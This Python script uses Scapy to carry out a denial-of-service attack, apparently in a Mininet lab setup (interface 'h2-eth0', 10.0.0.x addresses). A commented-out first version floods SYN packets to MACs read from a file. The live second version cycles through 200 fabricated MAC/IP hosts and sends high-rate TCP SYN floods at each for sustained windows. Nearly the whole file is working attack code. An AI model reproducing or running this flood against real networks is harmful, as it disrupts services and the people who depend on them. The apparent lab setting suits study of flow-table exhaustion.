# #!/usr/bin/env python3


# from scapy.all import Ether, IP, TCP, sendp
# import time
# import random
# import os


# SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
# MAC_FILE = os.path.join(SCRIPT_DIR, "fake_macs.txt")


# ATTACK_INTERFACE = "h2-eth0"
# PACKET_RATE = 200              # High rate for DoS effect
# TOTAL_ATTACK_TIME = 60         # Attack duration


# def load_macs(filename):
#     """Load MACs from file"""
#     if not os.path.exists(filename):
#         print(f"[ERROR] {filename} not found!")
#         print("[HINT] Make sure fake_macs.txt is in the same directory as this script")
#         return []

#     with open(filename, "r") as f:
#         macs = [line.strip() for line in f if line.strip()]

#     return macs


# def main():
#     print("[*] Stage-2 DoS Attack Started")
#     print(f"[*] Loading MACs from: {MAC_FILE}")

#     # Load MACs
#     fake_macs = load_macs(MAC_FILE)
#     if not fake_macs:
#         return

#     print(f"[*] Loaded {len(fake_macs)} MAC addresses")

#     # Use subset for attack
#     attack_macs = fake_macs[:100] if len(fake_macs) > 100 else fake_macs
#     print(f"[*] Targeting {len(attack_macs)} MACs for DoS")
#     print(f"[*] Sample targets: {attack_macs[:3]}...")
#     print(f"[*] Rate: {PACKET_RATE} packets/second")
#     print(f"[*] Duration: {TOTAL_ATTACK_TIME} seconds")

#     packet_counter = 0
#     start_time = time.time()

#     try:
#         while time.time() - start_time < TOTAL_ATTACK_TIME:
#             target_mac = random.choice(attack_macs)

#             pkt = Ether(dst=target_mac, src="00:00:00:00:00:02")
#             pkt /= IP(
#                 src="10.0.0.2",
#                 dst=f"10.0.0.{random.randint(100, 200)}"
#             )
#             pkt /= TCP(
#                 dport=random.randint(1, 65535),
#                 sport=random.randint(1024, 65535),
#                 flags="S"
#             )

#             sendp(pkt, iface=ATTACK_INTERFACE, verbose=False)
#             packet_counter += 1

#             if packet_counter % 100 == 0:
#                 elapsed = time.time() - start_time
#                 rate = packet_counter / elapsed if elapsed > 0 else 0
#                 remaining = TOTAL_ATTACK_TIME - elapsed
#                 print(f"[+] {packet_counter} packets | {rate:.1f} pkt/s | {remaining:.0f}s left")

#             time.sleep(1.0 / PACKET_RATE)

#     except KeyboardInterrupt:
#         print("\n[*] Attack interrupted")

#     finally:
#         elapsed = time.time() - start_time
#         print(f"\n[*] DoS Attack Finished")
#         print(f"[*] Total packets sent: {packet_counter}")
#         print(f"[*] Attack duration: {elapsed:.1f} seconds")
#         print(f"[*] Average rate: {packet_counter / elapsed:.1f} packets/second")

#         if elapsed > 0:
#             flows_per_sec = len(attack_macs) * (packet_counter / elapsed) / PACKET_RATE
#             print(f"[*] Estimated new flows/sec: {flows_per_sec:.1f}")


# if __name__ == "__main__":
#     main()
from scapy.all import *
import time
import itertools
import random

# =========================
# ATTACK CONFIG
# =========================
ATTACKER_MAC = "00:00:00:00:00:02"
ATTACKER_IP  = "10.0.0.2"

INTERFACE = "h2-eth0"

PACKET_GAP = 0.001      # High rate (1 ms)
ATTACK_DURATION = 10.0  # 🔥 KEY: sustained window (seconds)
DST_PORT = 80

# =========================
# FAKE HOST LIST (200)
# =========================
fake_hosts = []

for i in range(200):
    mac = f"02:00:00:00:{i//256:02x}:{i%256:02x}"
    ip  = f"10.0.0.{100 + (i % 100)}"
    fake_hosts.append((mac, ip))

print(f"[+] Loaded {len(fake_hosts)} fake hosts")

# =========================
# ATTACK LOOP
# =========================
try:
    for dst_mac, dst_ip in itertools.cycle(fake_hosts):

        print(f"\n[ATTACK] Targeting {dst_mac} ({dst_ip}) for {ATTACK_DURATION}s")

        start_time = time.time()

        while time.time() - start_time < ATTACK_DURATION:
            pkt = Ether(src=ATTACKER_MAC, dst=dst_mac)
            pkt /= IP(src=ATTACKER_IP, dst=dst_ip)
            pkt /= TCP(
                sport=random.randint(1024, 65535),
                dport=DST_PORT,
                flags="S"
            )

            sendp(pkt, iface=INTERFACE, verbose=False)
            time.sleep(PACKET_GAP)

except KeyboardInterrupt:
    print("\n[!] Attack stopped by user")
